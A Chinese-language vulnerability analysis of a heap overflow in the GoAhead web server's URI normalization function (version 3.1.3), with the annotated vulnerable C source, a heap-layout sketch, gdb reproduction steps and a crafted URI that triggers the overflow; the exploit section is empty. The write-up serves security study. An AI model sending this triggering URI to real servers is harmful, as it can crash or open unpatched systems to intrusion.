## 漏洞成因



触发漏洞的函数源码如下:

```c
PUBLIC char *websNormalizeUriPath(char *pathArg)
{
    char    *dupPath, *path, *sp, *dp, *mark, **segments;
    int     firstc, j, i, nseg, len;

    if (pathArg == 0 || *pathArg == '\0') {
        return "";
    }
    len = (int) slen(pathArg);
    if ((dupPath = walloc(len + 2)) == 0) {
        return NULL;
    }
    strcpy(dupPath, pathArg);

    if ((segments = walloc(sizeof(char*) * (len + 1))) == 0) {
        return NULL;
    }
    nseg = len = 0;
    firstc = *dupPath;
    for (mark = sp = dupPath; *sp; sp++) {     // /http////HTTP
        if (*sp == '/') {
            *sp = '\0';             //  '/'替换为 '\0'(字符串结尾)
            while (sp[1] == '/') {
                sp++;               // 将多个连在一起的'/'看作一个'/'
            }
            segments[nseg++] = mark; //mark指向字符串的开始
            len += (int) (sp - mark); // 等于 slen(path)-'/'的个数(....)
            mark = sp + 1;          // 调整mark指向下一个字符串的开始
        }
    }
    segments[nseg++] = mark;
    len += (int) (sp - mark);
    for (j = i = 0; i < nseg; i++, j++) {   // i作为输入指针, j作为输出指针  , nseg是segment数组的元素个数
        sp = segments[i];
        if (sp[0] == '.') { 			// 处理了 '.' 和 '..'两种情况, 忽略了其他
          if (sp[1] == '\0')  {
                if ((i+1) == nseg) {
                    segments[j] = "";
                } else {
                    j--;
                }
            } else if (sp[1] == '.' && sp[2] == '\0')  {
                if (i == 1 && *segments[0] == '\0') {
                    j = 0;
                } else if ((i+1) == nseg) {
                    if (--j >= 0) {
                        segments[j] = "";
                    }
                } else {
                    j = max(j - 2, -1);
                }
            }
        } else {
            segments[j] = segments[i];     // 如果不是'.'和'..'这两种情况, 直接复制
        }
    }
    nseg = j;    // 分隔符 '/'的个数
    assert(nseg >= 0);
    if ((path = walloc(len + nseg + 1)) != 0) { 
        for (i = 0, dp = path; i < nseg; ) {
            strcpy(dp, segments[i]);
            len = (int) slen(segments[i]);
            dp += len;
            if (++i < nseg || (nseg == 1 && *segments[0] == '\0' && firstc == '/')) {
                *dp++ = '/';
            }
        }
        *dp = '\0';
    }
    wfree(dupPath);
    wfree(segments);
    if ((path[0] != '/') || strchr(path, '\\')) {
        return 0;
    }
    return path;
}
```

关于这个函数更详细的分析见: 

- http://seclists.org/fulldisclosure/2015/Mar/157
- https://www.52pojie.cn/thread-514097-1-1.html



3个malloc之后堆布局如下所示:

```

|  top chunk |
|____________|
|            |
|    path    |
|____________|
|            |
|  segments  |
|____________|
|            |
|  dupPath   |
|____________|
```

其中path会发生堆溢出





## POC

这里用的是3.1.3版本.



1. `make`
2. `make install`
3. `sudo goahead -v --home /etc/goahead /var/www/goahead-default`
4. `ps -ef`
5. `gdb attach pid`
6. 然后在gdb中输入`b websNormalizeUriPath`, 在函数开始下断点
7. 在运行poc



触发漏洞的uri长这样: `/yyyyyyy/./yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy/.gh`



第二个for循环之后得到的segmens是这样:

```
segments[0]:  '\0'
segments[1]:  'yyyyyyy'
segments[2]:  'yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy'
segments[3]:  'yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy'
segments[4]:  '.gh'
```



nesg = j == 4,  segments的前四项数据会strcpy到path堆块中, 破坏top chunk的堆头,





## exp









## 参考

- https://www.52pojie.cn/thread-598697-1-1.html